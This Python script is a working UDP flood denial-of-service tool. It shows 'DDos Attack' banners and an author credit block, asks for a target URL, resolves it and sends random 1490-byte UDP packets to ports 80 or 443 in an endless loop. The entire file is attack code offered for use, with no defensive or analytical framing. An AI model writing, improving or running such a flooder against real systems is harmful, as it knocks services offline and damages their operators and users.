import sys
import os
import time
from tqdm import tqdm
import socket
import random
from rich import print
from colorama import Fore, Style  
from rich.console import Console
from rich.progress import Progress
import urllib.parse

console = Console()

# Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
year = now.year

def create_yellow_progress_bar(total_steps):
    with Progress() as progress:
        task = progress.add_task("Progressing...", total=total_steps)

        while not progress.finished:
            time.sleep(0.1)  # 模拟进度延迟
            progress.update(task, advance=1)  # 模拟进度增加1步
            
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

DDos = """
  ____  ____                 _   _   _             _    
 |  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __
 | | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ /
 | |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   < 
 |____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\\                                                       
"""

text = """      _     _ _            
  ___| |__ (_) |_ ___ _ __ 
 / __| '_ \| | __/ _ \ '__|
 \__ \ | | | | ||  __/ |   
 |___/_| |_|_|\__\___|_|                                                                 
"""

show = """
Make By Shiter

/-------------------------------------------------------------------------------------\\
|                                                                                     |
|Author   : SHITER                                                                    |
|You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA                  |
|github   : https://github.com/Ha3MrX                                                 |
|Facebook : https://www.facebook.com/muhamad.jabar222                                 |
\-------------------------------------------------------------------------------------/
"""

bytes = random._urandom(1490)
print("")
print(f'[white]{DDos}[/white]')
print(f'[white]{text}[/white]')
print(f'[white]{show}[/white]')

console.print("[white]URL>[/]", style="white", end="")

url = input()

port = 443


if __name__ == '__main__':
    if True:
        total_steps = 100

        create_yellow_progress_bar(total_steps)


        print("Start shit!")
        time.sleep(1)
        sent = 0
        attack_packets = 0

        while True:
            try:
                parsed_url = urllib.parse.urlparse(url)
                host = parsed_url.hostname

                ip = socket.gethostbyname(host)

                if parsed_url.scheme == 'http':
                    port = 80
                elif parsed_url.scheme == 'https':
                    port = 443

                sock.sendto(bytes, (ip, port))
                sent = sent + 1
                print(f"[white]Sent {sent} packets to {ip} on port {port}[/white]")

            except Exception as e:
                print(f"An error occurred: {e}")
